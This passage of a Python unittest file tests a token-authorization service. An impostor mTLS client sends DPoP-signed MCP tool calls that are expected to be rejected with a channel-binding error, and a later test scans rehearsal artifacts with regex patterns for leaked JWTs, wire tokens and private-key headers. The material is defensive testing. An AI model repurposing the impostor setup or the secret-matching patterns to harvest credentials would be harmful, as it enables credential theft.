            co_tok = CoAuthorizedToken.assemble_and_sign(alice_id, t1, t_owner).encode_compact()

            mcp_u = f"{in_b.rstrip('/')}/mcp"
            with httpx.Client(verify=impostor_mtls.verify_for_target(mcp_u, expected_spiffe_id=bob_id.spiffe_id)) as cli:
                for tok_str in (t1.encode_compact(), mp_tok, co_tok):
                    dpop = create_dpop_proof(alice_id, "POST", mcp_u, tok_str)
                    resp = cli.post(
                        mcp_u,
                        json={"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "calendar_free_busy", "arguments": {}}},
                        headers={"Authorization": f"DPoP {tok_str}", "DPoP": dpop},
                    )
                    self.assertEqual(resp.status_code, 403)
                    self.assertEqual(resp.json()["error"], "MTLS_CHANNEL_BINDING_MISMATCH")
        finally:
            if prev_fault is not None:
                os.environ["LCT_ENABLE_FAULT_INJECTION"] = prev_fault
            sc_bob.stop()
            impostor_mtls.cleanup()
            bob_mtls.cleanup()

    def test_08_rehearsal_archive_and_secret_hygiene_verification(self) -> None:
        """Verify M10 live 3-cluster rehearsal archive (`12/12 PASS`, `0` central audit, `0` leaked secrets)."""
        summary_file = M10_REHEARSAL_DIR / "workspace_platform_v2_summary.json"
        self.assertTrue(summary_file.is_file(), f"Missing {summary_file}")
        summary = json.loads(summary_file.read_text(encoding="utf-8"))
        self.assertIs(summary["central_audit_collector_deployed"], False)
        self.assertEqual(summary["overall_status"], "PASS")
        self.assertEqual(len(summary["scenarios"]), 12)
        for name, sc_doc in summary["scenarios"].items():
            self.assertEqual(sc_doc.get("status"), "PASS", f"Scenario {name} did not PASS")

        for fname in ("distributed_audit_cli_s8.json", "distributed_audit_cli_s11.json"):
            aud = json.loads((M10_REHEARSAL_DIR / fname).read_text(encoding="utf-8"))
            self.assertIs(aud["reconstructed_complete"], True)
            self.assertEqual(aud["unreachable_nodes"], {})
            self.assertEqual(aud["anomalies"], [])

        # Secret hygiene scan across all rehearsal artifacts
        jwt_re = re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}")
        wire_tok_re = re.compile(r"lct(?:1|mp1|m1|co1)\.[A-Za-z0-9_-]{16,}")
        priv_pem_prefix = "-----BEGIN " + "PRIVATE KEY-----"
        ec_pem_prefix = "-----BEGIN EC " + "PRIVATE KEY-----"
        for fpath in M10_REHEARSAL_DIR.iterdir():
            if fpath.is_file():
                txt = fpath.read_text(encoding="utf-8")
                self.assertNotIn(priv_pem_prefix, txt, f"Private key leaked in {fpath.name}")
                self.assertNotIn(ec_pem_prefix, txt, f"EC private key leaked in {fpath.name}")
                self.assertIsNone(jwt_re.search(txt), f"Raw JWT leaked in {fpath.name}")
                self.assertIsNone(wire_tok_re.search(txt), f"Raw LCT wire token leaked in {fpath.name}")


if __name__ == "__main__":
    unittest.main()
